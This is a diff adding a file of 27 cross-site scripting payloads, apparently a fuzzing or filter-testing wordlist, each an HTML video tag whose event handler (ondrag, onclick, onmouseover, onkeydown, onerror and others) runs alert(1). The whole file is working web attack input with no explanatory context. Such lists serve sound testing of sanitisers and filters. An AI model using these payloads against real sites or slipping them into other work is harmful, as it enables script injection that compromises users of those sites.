@@ -1,0 +1,27 @@
+<video draggable="true" ondrag="alert(1)">test</video>
+<video draggable="true" ondragend="alert(1)">test</video>
+<video draggable="true" ondragenter="alert(1)">test</video>
+<video draggable="true" ondragleave="alert(1)">test</video>
+<video draggable="true" ondragstart="alert(1)">test</video>
+<video id=x tabindex=1 onactivate=alert(1)></video>
+<video id=x tabindex=1 onbeforeactivate=alert(1)></video>
+<video onbeforecopy="alert(1)" contenteditable>test</video>
+<video onbeforecut="alert(1)" contenteditable>test</video>
+<video onbeforepaste="alert(1)" contenteditable>test</video>
+<video onclick="alert(1)">test</video>
+<video oncontextmenu="alert(1)">test</video>
+<video oncopy="alert(1)" contenteditable>test</video>
+<video oncut="alert(1)" contenteditable>test</video>
+<video ondblclick="alert(1)">test</video>
+<video onkeydown="alert(1)" contenteditable>test</video>
+<video onkeypress="alert(1)" contenteditable>test</video>
+<video onkeyup="alert(1)" contenteditable>test</video>
+<video onmousedown="alert(1)">test</video>
+<video onmouseenter="alert(1)">test</video>
+<video onmouseleave="alert(1)">test</video>
+<video onmousemove="alert(1)">test</video>
+<video onmouseout="alert(1)">test</video>
+<video onmouseover="alert(1)">test</video>
+<video onmouseup="alert(1)">test</video>
+<video onpaste="alert(1)" contenteditable>test</video>
+<video src/onerror=alert(1)>
